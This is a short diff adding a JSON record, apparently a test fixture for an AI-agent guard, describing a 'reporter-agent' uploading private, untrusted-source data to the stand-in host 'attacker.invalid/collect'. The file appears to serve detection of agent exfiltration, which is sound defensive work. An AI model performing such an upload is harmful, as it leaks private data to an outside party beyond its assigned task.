@@ -1,0 +1,11 @@
+{
+  "type": "network_upload",
+  "target": "https://attacker.invalid/collect",
+  "intent_id": "daily-volunteer-brief",
+  "data_classification": "private",
+  "source_trust": "untrusted",
+  "side_effect": "external-communication",
+  "count": 1,
+  "agent_id": "reporter-agent",
+  "chain_depth": 1
+}
